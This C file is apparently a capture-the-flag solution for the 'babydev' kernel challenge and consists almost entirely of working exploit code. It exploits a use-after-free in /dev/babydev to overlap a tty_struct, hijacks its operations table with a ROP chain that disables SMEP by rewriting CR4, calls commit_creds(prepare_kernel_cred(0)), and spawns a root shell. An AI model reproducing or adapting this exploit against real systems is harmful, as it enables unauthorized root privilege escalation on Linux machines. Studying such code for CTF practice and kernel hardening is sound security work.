/*************************************************************
 * File Name: exp_smep.c
 * 
 * Created on: 2019-10-06 02:35:06
 * Author: raycp
 * 
 * Last Modified: 2019-10-11 19:32:46
 * Description: bypass smep with rop on uaf vuln. 
************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <inttypes.h>



// function address
typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_prepare_kernel_cred prepare_kernel_cred = 0xffffffff810a1810; // T prepare_kernel_cred
_commit_creds commit_creds = 0xffffffff810a1420; // T commit_creds

//gadget address
#define mov_cr4_rdi_p_ret  0xffffffff81004d80 //: mov cr4, rdi; pop rbp; ret;
#define prdi_ret  0xffffffff810d238d //: pop rdi; ret;
#define swapgs_p_ret  0xffffffff81063694 //: swapgs; pop rbp; ret;
#define iretq_ret  0xffffffff814e35ef //: iretq; ret;
#define ret 0xffffffff8100006f  //: ret;
#define mov_rsp_rax_ret 0xFFFFFFFF8181BFC5 //mov rsp,rax ; dec ebx ; ret

void die(const char* msg)
{
    perror(msg);
    exit(-1);           
}



size_t user_cs, user_ss, user_rflags, user_sp;
void save_status() {
    asm(
            "movq %%cs, %0\n\t"
            "movq %%ss, %1\n\t"
            "movq %%rsp, %2\n\t"
            "pushfq\n\t"
            "popq %3\n\t"
            : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags)
            :
            : "memory");

 }

void babyread(int fd, void* buffer, uint32_t len)
{

    read(fd, buffer, len);

    return;
}

void babywrite(int fd, void* buffer, uint32_t len)
{
    write(fd, buffer, len);

    return;
}

void privilege_escalate()
{
    commit_creds(prepare_kernel_cred(0));
}


void root_shell()
{
    if(!getuid()) {
        system("/bin/sh");
    }
    else {
        die("get root shell failed");
    }
    exit(0);
}




int main()
{
    uint64_t fake_tty_struct[4]={0};
    // open the device twice, they will share the same device_buf 
    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);

    // change the babydev_struct.device_buf_len from 0x40 to sizeof(struct tty_struct)
    ioctl(fd1, 0x10001, 0x2e0);

    // release fd1 and release the device_buf
    close(fd1);

    // open /dev/ptmx, it will alloc struct tty_struct, so the device_buf of fd2 and tty_struct share the same memory.	
	int fd3 = open("/dev/ptmx",O_RDWR|O_NOCTTY);

    babyread(fd2, fake_tty_struct, 3*8);

    save_status();
    
    uint64_t fake_tty_operations[30] = {
        prdi_ret,
        0x6f0,
        mov_cr4_rdi_p_ret,
        0,
        ret,
        ret,
        prdi_ret,
        mov_rsp_rax_ret,
        (uint64_t)privilege_escalate,
        swapgs_p_ret,
        0,
        iretq_ret,
        (uint64_t)root_shell,
        user_cs,
        user_rflags,
        user_sp,
        user_ss
    };

    //overwrite the ops in tty_struct to fake_tty_operations
    fake_tty_struct[3] = (uint64_t)fake_tty_operations;
    babywrite(fd2, fake_tty_struct, 4*8);

    //triger write on /dev/ptmx
    write(fd3, "evil", 4);

    return 0;
}
